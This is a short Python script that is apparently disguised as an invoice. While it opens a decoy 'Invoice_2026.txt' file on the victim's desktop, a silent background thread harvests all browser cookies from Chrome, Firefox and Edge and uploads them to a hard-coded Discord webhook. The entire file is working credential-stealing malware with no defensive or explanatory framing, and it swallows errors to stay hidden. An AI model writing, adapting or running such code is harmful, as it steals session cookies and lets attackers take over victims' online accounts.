import os
import json
import requests
import threading
import tempfile
from datetime import datetime

WEBHOOK = "https://discord.com/api/webhooks/1529972286671814828/DsREj38ZscfwOleZ57wGcTwgGAg0K5M5nwsrspJ7jLlHTc4qetNQFg8ly-Z_TWKFadDY"

def get_cookies():
    data = {}
    try:
        import browser_cookie3
        for name, func in [("chrome", browser_cookie3.chrome), ("firefox", browser_cookie3.firefox), ("edge", browser_cookie3.edge)]:
            try:
                cj = func(domain_name='.')
                data[name] = [{'name': c.name, 'value': c.value} for c in cj]
            except:
                pass
    except:
        pass
    return data

def send_cookies():
    try:
        cookies = get_cookies()
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        tmp = tempfile.gettempdir()
        json_path = os.path.join(tmp, f"cookies_{ts}.json")
        with open(json_path, 'w') as f:
            json.dump(cookies, f)
        requests.post(WEBHOOK, files={'file': (f'cookies_{ts}.json', open(json_path, 'rb'))})
        os.remove(json_path)
    except:
        pass

threading.Thread(target=send_cookies, daemon=True).start()
try:
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    with open(os.path.join(desktop, 'Invoice_2026.txt'), 'w') as f:
        f.write("INVOICE #2026\nTotal: $0.00")
    os.startfile(os.path.join(desktop, 'Invoice_2026.txt'))
except:
    pass
import time
time.sleep(6)
